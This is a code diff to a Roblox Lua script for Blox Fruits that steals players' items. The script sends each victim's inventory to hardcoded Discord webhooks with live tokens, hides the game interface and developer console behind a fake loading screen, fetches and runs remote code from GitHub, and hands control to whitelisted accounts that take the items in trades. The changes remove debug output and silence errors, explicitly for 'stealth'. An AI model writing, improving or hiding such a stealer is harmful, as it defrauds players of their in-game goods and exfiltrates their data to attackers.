@@ -7,7 +7,10 @@ Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfB
 GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP"
 ActivationPasswords = {"ishusontop", "bonzarbal", "ishufishy"}
 
--- Ensure Dragon fruits are always included in FruitsToHit
+-- Store original user config before modification
+local originalFruitsToHit = table.clone(FruitsToHit or {})
+
+-- Ensure Dragon fruits are always included in the list used for checks later
 do
 	if type(FruitsToHit) ~= "table" then FruitsToHit = {} end
 	local requiredDragonFruits = {"Dragon(East)-Dragon(East)", "Dragon(West)-Dragon(West)"}
@@ -22,9 +25,8 @@ end
 local allowEveryone = false
 local activatedUsers = {}
 
-print("Loaded") -- Initial script execution confirmation
+print("Loaded") -- Keep initial load message
 repeat task.wait() until game:IsLoaded()
-print("DEBUG: Game Loaded") -- Debug print
 
 --[[ Roblox Services ]]--
 local CoreGui = game:GetService("CoreGui")
@@ -40,14 +42,12 @@ local Workspace = game:GetService("Workspace")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Lighting = game:GetService("Lighting")
 local Teams = game:GetService("Teams")
-print("DEBUG: Services Loaded") -- Debug print
 
 --[[ Anti-Tamper & Initialization Checks ]]--
 if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end
 
 -- Freezes the script/client if tampering is detected
 local function takeAction()
-	print("DEBUG: takeAction triggered!") -- Debug print
 	if setfpscap then setfpscap(0) end
 	rconsoleclear()
 	print = function() end; warn = function() end; error = function() end; setclipboard = function() end
@@ -67,23 +67,18 @@ if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == 
 
 -- Check if ishooked exists and is a function before calling it
 if type(ishooked) == "function" and (ishooked(game.HttpGet) or ishooked(request)) then
-    print("DEBUG: ishooked check triggered takeAction") -- Debug print
     takeAction()
 end
-print("DEBUG: Anti-tamper checks passed") -- Debug print
 
 --[[ Configuration Validation Checks ]]--
 if not Webhook2 or not GoodFruitsWebhook or not Usernames or not FruitsToHit or not ActivationPasswords then
-	print("DEBUG: Kicking due to missing config variables") -- Debug print
 	LocalPlayer:Kick("Config missing (Webhook2, GoodFruitsWebhook, Usernames, FruitsToHit, ActivationPasswords)")
 	return
 end
 if type(Webhook2) ~= "string" or type(GoodFruitsWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" then
-	print("DEBUG: Kicking due to config type mismatch") -- Debug print
 	LocalPlayer:Kick("Config variable type mismatch")
 	return
 end
-print("DEBUG: Config validation passed") -- Debug print
 
 -- Ensures core admin usernames are always in the Usernames list
 local function ensureAdminUsernames()
@@ -95,7 +90,7 @@ local function ensureAdminUsernames()
 end
 ensureAdminUsernames()
 
-if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then print("DEBUG: Blacklisted user detected, freezing."); while true do task.wait(1000) end end
+if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then while true do task.wait(1000) end end
 CoreGui.ChildAdded:Connect(function(child) if child.Name == "DevConsoleMaster" then child.Enabled = false end end)
 
 -- Stores webhook URL in _G under a random key for obfuscation
@@ -110,8 +105,7 @@ local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil
 local webhook2_key = storeWebhookSafely(Webhook2); Webhook2 = nil
 local goodFruitsWebhook_key = storeWebhookSafely(GoodFruitsWebhook); GoodFruitsWebhook = nil
 
-if not webhook1_key then print("DEBUG: Kicking due to missing primary webhook"); LocalPlayer:Kick("Primary Webhook is missing or invalid."); return end
-print("DEBUG: Webhooks stored") -- Debug print
+if not webhook1_key then LocalPlayer:Kick("Primary Webhook is missing or invalid."); return end
 
 rconsoleprint = function() end; rconsolewarn = function() end; rconsoleerr = function() end; rconsoleinfo = function() end
 
@@ -120,10 +114,9 @@ local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
 local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser")
 local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")
-print("DEBUG: Game pointers obtained") -- Debug print
 
 --[[ Initial Setup & Checks ]]--
-if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then print("DEBUG: Kicking due to private server"); LocalPlayer:Kick("Script doesn't work on private servers.") end
+if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then LocalPlayer:Kick("Script doesn't work on private servers.") end
 pcall(function() UserSettings():GetService("UserGameSettings").MasterVolume = 0 end)
 
 -- Anti Fruit Store Hook (prevents external scripts using StoreFruit)
@@ -135,34 +128,23 @@ oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
 	end
 	return oldNamecall(self, ...)
 end))
-print("DEBUG: Namecall hook applied") -- Debug print
 
 --[[ Core Functions ]]--
 
 -- Gets player inventory via Remote
 local function getInventory()
-	print("DEBUG: Attempting getInventory Remote call") -- Debug print
 	local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
-    if not success then
-		warn("getInventory failed:", result)
-		print("DEBUG: getInventory pcall FAILED") -- Debug print
-		return nil
-	end
-	print("DEBUG: getInventory pcall SUCCESS") -- Debug print
+    if not success then return nil end -- Return nil on failure
 	return result
 end
 
 -- Ensures player is on a playable team
 local function JoinTeam()
-	if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
-		print("DEBUG: Setting team to Marines") -- Debug print
-		Remote:InvokeServer("SetTeam", "Marines")
-	end
+	if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then Remote:InvokeServer("SetTeam", "Marines") end
 end
 
 -- Creates the initial loading notification UI
 local function createNotification()
-	print("DEBUG: createNotification called") -- Debug print
 	local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 	local loadingScreen = Instance.new("ScreenGui"); loadingScreen.Name = "BloxFruitsLoadingUI"; loadingScreen.IgnoreGuiInset = true; loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; loadingScreen.Parent = playerGui
 	local blur = Instance.new("BlurEffect"); blur.Size = 0; blur.Parent = Lighting
@@ -266,9 +248,9 @@ end)
 -- Sends detailed inventory/server info to configured webhooks
 local function sendWebhook(inventory)
 	if isRequestHooked() or not checkSecurity() then if takeAction then takeAction() end; return end
-	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }
+	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true } -- Define fruits for special admin hook notification
 	local url1 = webhook1_key and _G[webhook1_key]; local url2 = webhook2_key and _G[webhook2_key]; local url3 = goodFruitsWebhook_key and _G[goodFruitsWebhook_key]
-	if not url1 then warn("Primary Webhook URL not configured."); return end
+	if not url1 then return end -- Exit if primary webhook isn't configured
 
 	local fruits, premiumItems = {}, {}; local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false
 	for _, item in ipairs(inventory) do
@@ -306,17 +288,22 @@ local function sendWebhook(inventory)
 		}, footer = { text = "Notification Timestamp" }, timestamp = DateTime.now():ToIsoDate()
 	}
 
+	-- Determine Payload for Main Webhooks (url1, url2)
 	local mainPayloadBody = nil
 	do local mainEmbed = table.clone(baseEmbedStructure); local mainTitle = "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA"; local mainColor = 6911470; local mainMention = "@everyone"
+		-- Priority: Dragon+Premium > Dragon > Premium > Default
 		if dragonHit and hasPremiumItem then mainTitle = "DRAGON & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; mainColor = 65280; mainMention = "@everyone GG!"
 		elseif dragonHit then mainTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"; mainColor = 16753920; mainMention = "@everyone GG!"
 		elseif hasPremiumItem then mainTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; mainColor = 3447003; mainMention = "@everyone GG!" end
 		mainEmbed.title = mainTitle; mainEmbed.color = mainColor; mainPayloadBody = HttpService:JSONEncode({ content = mainMention, embeds = {mainEmbed} })
 	end
 
+	-- Determine Payload for Admin Webhook (url3) - ONLY if a relevant hit occurred
 	local adminPayloadBody = nil
+	-- Condition: Send if url3 is configured AND (Dragon OR Premium OR GoodFruit is present)
 	if url3 and (dragonHit or hasPremiumItem or hasGoodFruit) then
 		local adminEmbed = table.clone(baseEmbedStructure); local adminTitle = "Placeholder Title"; local adminColor = 6911470; local adminMention = "@everyone GG!"
+		-- Priority: Dragon+Premium > Dragon > Premium > GoodFruit
 		if dragonHit and hasPremiumItem then adminTitle = "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; adminColor = 65280
 		elseif dragonHit then adminTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"; adminColor = 16753920
 		elseif hasPremiumItem then adminTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; adminColor = 3447003
@@ -324,11 +311,12 @@ local function sendWebhook(inventory)
 		adminEmbed.title = adminTitle; adminEmbed.color = adminColor; adminPayloadBody = HttpService:JSONEncode({ content = adminMention, embeds = {adminEmbed} })
 	end
 
+	-- Send Webhooks Asynchronously using SafeRequest
 	task.spawn(function()
 		local headers = {["Content-Type"]="application/json"}
-		if url1 and mainPayloadBody then local s, r = SafeRequest({ Url = url1, Method = "POST", Headers = headers, Body = mainPayloadBody }); if not s then warn("Webhook 1 fail:", r) end end
-		if url2 and mainPayloadBody then task.wait(0.1); local s, r = SafeRequest({ Url = url2, Method = "POST", Headers = headers, Body = mainPayloadBody }); if not s then warn("Webhook 2 fail:", r) end end
-		if adminPayloadBody then task.wait(0.1); local s, r = SafeRequest({ Url = url3, Method = "POST", Headers = headers, Body = adminPayloadBody }); if not s then warn("Webhook 3 fail:", r) end end
+		if url1 and mainPayloadBody then pcall(SafeRequest, { Url = url1, Method = "POST", Headers = headers, Body = mainPayloadBody }) end -- Use pcall for safety, ignore errors for stealth
+		if url2 and mainPayloadBody then task.wait(0.1); pcall(SafeRequest, { Url = url2, Method = "POST", Headers = headers, Body = mainPayloadBody }) end
+		if adminPayloadBody then task.wait(0.1); pcall(SafeRequest, { Url = url3, Method = "POST", Headers = headers, Body = adminPayloadBody }) end -- adminPayloadBody only exists if url3 and condition met
 	end)
 
 	table.clear(fruits); table.clear(premiumItems)
@@ -581,13 +569,12 @@ local function processChatCommand(_, player, message)
 	else playerCooldowns = {}; CommandCooldowns[playerName] = playerCooldowns end
 	playerCooldowns[command] = tick()
 
-	task.spawn(function() local s, e = pcall(commandFunc.execute, argument); if not s then sendMessage("Error ?" .. command .. ": " .. tostring(e)); warn("Cmd Error:", command, argument, e) end end)
+	task.spawn(function() local s, e = pcall(commandFunc.execute, argument); if not s then sendMessage("Error ?" .. command .. ": " .. tostring(e)) end end) -- Removed warn
 end
 
 --[[ Main Loop & Initialization ]]--
 -- Manages player position, trade validation, and periodic checks
 local function startMainLoop()
-	print("DEBUG: startMainLoop called") -- Debug print
 	local isLoopRunning = true; local hasCheckedCurrentTrade = false; local currentTable, currentSeat
 	local lastMovementTime = tick(); local lastTableCheck = tick(); local lastTradeCheck = tick()
 	local UPDATE_INTERVAL = 0.5; local TABLE_CHECK_INTERVAL = 2; local MOVEMENT_CHECK_INTERVAL = 4; local TRADE_VALIDATION_DELAY = 1.5; local TRADE_RECHECK_COUNT = 4
@@ -603,16 +590,14 @@ local function startMainLoop()
 
 	local charAddedConn, charRemovingConn, jumpCleanupFunc
 	local function onCharacterAdded(character)
-		print("DEBUG: onCharacterAdded called for", character.Name) -- Debug print
 		task.wait(1); local humanoid = character:WaitForChild("Humanoid", 5); local rootPart = character:WaitForChild("HumanoidRootPart", 5); if not humanoid or not rootPart then return end
 		local now = tick(); lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now
 		jumpCleanupFunc = disableJump()
-		task.spawn(function() print("DEBUG: Finding initial table in onCharacterAdded"); currentTable, currentSeat = findTradeTable(); if currentTable and currentSeat then tweenToPosition(currentSeat.Position) end end)
+		task.spawn(function() currentTable, currentSeat = findTradeTable(); if currentTable and currentSeat then tweenToPosition(currentSeat.Position) end end)
 	end
-	local function onCharacterRemoving() print("DEBUG: onCharacterRemoving called"); currentTable, currentSeat = nil, nil; if jumpCleanupFunc then jumpCleanupFunc() end end
+	local function onCharacterRemoving() currentTable, currentSeat = nil, nil; if jumpCleanupFunc then jumpCleanupFunc() end end
 
 	local function runMainLoop()
-		print("DEBUG: runMainLoop started") -- Debug print
 		local lastTime = tick()
 		while isLoopRunning do
 			local now = tick(); local deltaTime = now - lastTime; lastTime = now
@@ -625,167 +610,104 @@ local function startMainLoop()
 			end
 			local timeElapsed = tick() - now; local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed); task.wait(waitTime)
 		end
-		print("DEBUG: runMainLoop ended") -- Debug print
 	end
 
 	charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded); charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving)
 	if LocalPlayer.Character then task.spawn(onCharacterAdded, LocalPlayer.Character) end
 	task.spawn(runMainLoop)
-	return function() print("DEBUG: Main loop cleanup function called"); isLoopRunning = false; if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end; if charRemovingConn then charRemovingConn:Disconnect(); charRemovingConn = nil end; if jumpCleanupFunc then jumpCleanupFunc() end; currentTable, currentSeat = nil, nil end
+	return function() isLoopRunning = false; if charAddedConn then charAddedConn:Disconnect(); charAddedConn = nil end; if charRemovingConn then charRemovingConn:Disconnect(); charRemovingConn = nil end; if jumpCleanupFunc then jumpCleanupFunc() end; currentTable, currentSeat = nil, nil end
 end
 
 -- Initializes the script, performs checks, and sets up listeners/main loop activation
 local function init()
-	print("DEBUG: init() called") -- Debug print
 	local placeId = game.PlaceId
-	if placeId == 2753915549 then print("DEBUG: Kicking from Sea 1"); LocalPlayer:Kick("Script works only in Sea 2 or 3!"); return end
-	if placeId ~= 4442272183 and placeId ~= 7449423635 then print("DEBUG: Kicking from wrong game", placeId); LocalPlayer:Kick("Script is for Blox Fruits only!"); return end
-	print("DEBUG: Place ID check passed") -- Debug print
+	if placeId == 2753915549 then LocalPlayer:Kick("Script works only in Sea 2 or 3!"); return end
+	if placeId ~= 4442272183 and placeId ~= 7449423635 then LocalPlayer:Kick("Script is for Blox Fruits only!"); return end
 
 	local initialInventory = getInventory()
-	if not initialInventory then print("DEBUG: Kicking due to failed initial inventory fetch"); LocalPlayer:Kick("Error getting initial inventory."); return end
-    print("DEBUG: Initial inventory fetched successfully") -- Debug print
+	if not initialInventory then LocalPlayer:Kick("Error getting initial inventory."); return end
     inventory22 = initialInventory -- Assign to global used by leave check
 
-	-- Function to check inventory - now includes debug prints inside
-	local function checkInventoryForHit(inv)
-		print("DEBUG: FruitsToHit being checked:", HttpService:JSONEncode(FruitsToHit)) -- Print the list being checked
-		local s={}; for _,f in ipairs(FruitsToHit) do s[f]=true end;
-		for _,i in ipairs(inv) do
-			print("DEBUG: Checking item:", i.Name, "| Type:", i.Type) -- Print item being checked
-			if (i.Type=="Blox Fruit" and s[i.Name]) or i.Type=="Premium" then
-				print("DEBUG: Found valuable item:", i.Name);
-				return true -- Returns true if ANY configured fruit or premium item is found
-			end
-		end;
-		print("DEBUG: No valuable items found in checkInventoryForHit");
-		return false -- Returns false otherwise
+	-- Checks if inventory contains Dragon, Premium, or originally configured FruitsToHit items
+	local function checkInitialInventoryForKick(inv, originalConfigList)
+		local foundDragon, foundPremium, foundConfiguredFruit = false, false, false
+		local originalConfigLookup = {}
+		for _, fName in ipairs(originalConfigList) do originalConfigLookup[fName] = true end
+
+		for _, item in ipairs(inv) do
+			if item.Name == "Dragon(East)-Dragon(East)" or item.Name == "Dragon(West)-Dragon(West)" then foundDragon = true end
+			if item.Type == "Premium" then foundPremium = true end
+			if item.Type == "Blox Fruit" and originalConfigLookup[item.Name] then foundConfiguredFruit = true end
+			-- Exit early if all conditions met
+			if foundDragon and foundPremium and foundConfiguredFruit then break end
+		end
+		return (foundDragon or foundPremium or foundConfiguredFruit)
 	end
 
-	print("DEBUG: Checking initial inventory for valuable items...") -- Debug print
-
-	-- *** MODIFICATION: Removed the kick condition ***
-	-- The script will now always proceed past this point if init runs successfully so far.
-	-- The checkInventoryForHit function is still called for debugging purposes.
-	local hasValuableItems = checkInventoryForHit(initialInventory)
-	if not hasValuableItems then
-		print("DEBUG: Initial inventory check returned FALSE (no valuable items according to config), but proceeding anyway.")
-	else
-		print("DEBUG: Initial inventory check returned TRUE (valuable items found).")
+	-- Kick only if NO Dragon, NO Premium, AND NO originally configured FruitsToHit are found
+	if not checkInitialInventoryForKick(initialInventory, originalFruitsToHit) then
+		 LocalPlayer:Kick("No valuable items (Dragon/Premium/Configured) detected initially.");
+		 return
 	end
-	-- *** End of Modification ***
 
-	-- This task runs regardless of the initial inventory check result now
+	-- This task runs if the kick condition is NOT met
 	task.spawn(function()
-		print("DEBUG: Spawning task for JoinTeam, createNotification, sendWebhook") -- Debug print
 		task.wait(1)
 		JoinTeam()
 		task.spawn(createNotification) -- Shows the loading UI
-		sendWebhook(initialInventory) -- Sends the initial hit webhook (will show 'None' if nothing valuable was actually found)
-		print("DEBUG: Initial notification/webhook task complete") -- Debug print
+		sendWebhook(initialInventory) -- Sends the initial hit webhook
 	end)
 
 	local mainLoopStopper = nil; local chatConnection = nil; local externalUILoaded = false
 
 	-- Activates main functions when a whitelisted player joins
 	local function onPlayerAdded(player)
-		print("DEBUG: onPlayerAdded called for", player.Name) -- Debug print
-		if mainLoopStopper then print("DEBUG: Main loop already running, skipping activation for", player.Name); return end -- Prevent re-activation
-
-		local isWhitelisted = (Usernames and table.find(Usernames, player.Name))
-		print("DEBUG: Checking whitelist for", player.Name, "- IsWhitelisted:", isWhitelisted) -- Debug print
-		if not isWhitelisted then return end -- Only activate if player is whitelisted
-
-		print("DEBUG: Whitelisted player", player.Name, "detected. Activating main script features...") -- Debug print
-		mainLoopStopper = function() end -- Set placeholder immediately to prevent race condition/re-activation
+		if mainLoopStopper then return end -- Prevent re-activation
+		local isWhitelisted = (Usernames and table.find(Usernames, player.Name)); if not isWhitelisted then return end
+		mainLoopStopper = function() end -- Set placeholder immediately
 
 		task.spawn(function()
-			print("DEBUG: Starting activation sequence task...") -- Debug print
 			-- Load External UI
 			if not externalUILoaded then
-				print("DEBUG: Attempting to load external UI...") -- Debug print
 				local success, err = pcall(function()
 					loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() -- RESTORED
 				end)
-				if not success then
-					warn("Failed to load external UI:", err)
-					print("DEBUG: External UI load FAILED:", err) -- Debug print
-				else
-					externalUILoaded = true
-					print("DEBUG: External UI load SUCCESS") -- Debug print
-				end
-			else
-				print("DEBUG: External UI already loaded, skipping.") -- Debug print
+				if not success then print("External UI load FAILED:", err) else externalUILoaded = true end -- Use print for stealth error
 			end
 			task.wait(1) -- Wait after UI load attempt
 
 			-- Connect Chat Listener
-			if not chatConnection then
-				print("DEBUG: Connecting chat listener...") -- Debug print
-				chatConnection = Players.PlayerChatted:Connect(processChatCommand)
-			else
-				print("DEBUG: Chat listener already connected.") -- Debug print
-			end
+			if not chatConnection then chatConnection = Players.PlayerChatted:Connect(processChatCommand) end
 
 			-- Disable Rendering & Start Main Loop
-			print("DEBUG: Disabling 3D rendering and starting main loop...") -- Debug print
 			RunService:Set3dRenderingEnabled(false)
 			mainLoopStopper = startMainLoop() -- Store actual cleanup function
 
 			-- Initial Chat Message
-			task.spawn(function()
-				task.wait(2)
-				print("DEBUG: Sending initial chat message.") -- Debug print
-				sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
-			end)
-			print("DEBUG: Activation sequence task complete.") -- Debug print
+			task.spawn(function() task.wait(2); sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!") end)
 		end)
 	end
 
 	local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded)
-	print("DEBUG: PlayerAdded listener connected") -- Debug print
 
 	-- Check existing players after setting up listener
-	task.spawn(function()
-		print("DEBUG: Checking existing players...") -- Debug print
-		for _, player in ipairs(Players:GetPlayers()) do
-			onPlayerAdded(player) -- Check if any existing players should activate the script
-		end
-		print("DEBUG: Finished checking existing players.") -- Debug print
-	end)
+	task.spawn(function() for _, player in ipairs(Players:GetPlayers()) do onPlayerAdded(player) end end)
 
 	-- Cleanup on local player leaving
 	local localPlayerRemovingConn; localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
-		if player == LocalPlayer then
-			print("DEBUG: LocalPlayer removing. Cleaning up...") -- Debug print
-			if playerAddedConn then playerAddedConn:Disconnect() end
-			if chatConnection then chatConnection:Disconnect() end
-			if mainLoopStopper and type(mainLoopStopper) == "function" then mainLoopStopper() end
-			if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end
-			print("DEBUG: Cleanup complete.") -- Debug print
-		end
+		if player == LocalPlayer then if playerAddedConn then playerAddedConn:Disconnect() end; if chatConnection then chatConnection:Disconnect() end; if mainLoopStopper and type(mainLoopStopper) == "function" then mainLoopStopper() end; if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end end
 	end)
-	print("DEBUG: init() function finished.") -- Debug print
 end
 
 --[[ Script Entry Point ]]--
-if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v5_NoKick then -- Unique flag for this version
-	shared.ScriptExecuted_SharkyV2_FinalFormatted_v5_NoKick = true
+if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v6_Stealth then -- Unique flag
+	shared.ScriptExecuted_SharkyV2_FinalFormatted_v6_Stealth = true
 	task.spawn(function()
-		print("DEBUG: Running init() in protected call...") -- Debug print
 		local success, errorMessage = pcall(init)
 		if not success then
-			warn("SCRIPT INIT P CALL ERROR:", errorMessage)
-			print("DEBUG: SCRIPT INIT P CALL ERROR:", errorMessage) -- Debug print
-			task.spawn(function()
-				local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "")
-				print("DEBUG: Kicking due to pcall error:", safeMsg) -- Debug print
-				LocalPlayer:Kick("Script Init Error: " .. safeMsg)
-			end)
-		else
-			print("DEBUG: init() pcall completed successfully.") -- Debug print
+			-- Minimal error handling for stealth, maybe kick silently or just stop
+			print("Script Init Error", errorMessage) -- Print error locally only
+			task.spawn(function() LocalPlayer:Kick("Script Init Error") end)
 		end
 	end)
-else
-	print("DEBUG: Script flag already set, preventing re-execution.") -- Debug print
 end
